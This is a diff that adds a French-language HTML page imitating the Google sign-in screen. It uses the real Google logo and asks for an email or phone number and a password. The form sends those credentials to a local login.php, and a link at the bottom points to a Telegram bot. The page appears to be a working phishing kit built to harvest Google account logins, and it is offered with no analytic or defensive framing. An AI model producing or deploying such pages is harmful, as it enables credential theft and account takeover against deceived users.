@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <title>Connexion Google</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: #fff;
+            margin: 0;
+            padding: 20px;
+            color: #202124;
+        }
+        .container {
+            max-width: 360px;
+            margin: 50px auto;
+            text-align: center;
+        }
+        .logo {
+            width: 80px;
+            margin-bottom: 20px;
+        }
+        h2 {
+            font-size: 24px;
+            font-weight: normal;
+            margin-bottom: 10px;
+        }
+        p {
+            font-size: 14px;
+            color: #5f6368;
+            margin-bottom: 20px;
+        }
+        a {
+            color: #1a73e8;
+            text-decoration: none;
+            font-size: 14px;
+        }
+        a:hover {
+            text-decoration: underline;
+        }
+        input[type="text"], input[type="password"] {
+            width: 100%;
+            padding: 14px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            margin-bottom: 15px;
+            font-size: 16px;
+        }
+        .btn {
+            width: 100%;
+            background-color: #1a73e8;
+            color: white;
+            border: none;
+            padding: 12px;
+            border-radius: 4px;
+            font-size: 14px;
+            cursor: pointer;
+        }
+        .btn:hover {
+            background-color: #1669c1;
+        }
+        .links {
+            text-align: left;
+            margin-top: 10px;
+        }
+        .bottom-links {
+            margin-top: 25px;
+            font-size: 14px;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google Logo" class="logo">
+    <h2>Connexion</h2>
+    <p>Utilisez votre compte Google. Il sera ajouté à cet appareil et disponible pour d'autres applis Google.</p>
+  
+    <form action="login.php" method="post">
+        <input type="text" name="email" placeholder="Adresse e-mail ou téléphone" required>
+        <div class="links"></div>
+        <a href="#">Adresse e-mail oubliée ?</a>
+        <input type="password" name="password" placeholder="Mot de passe" required>
+        <button type="submit">Se connecter</button>
+    </form>
+
+    <div class="bottom-links">
+        <a href="#">Créer un compte</a>
+    </div>
+</div>
+
+<a href="https://t.me/SamsmisBot">En savoir</a>
+
+</body>
+</html>
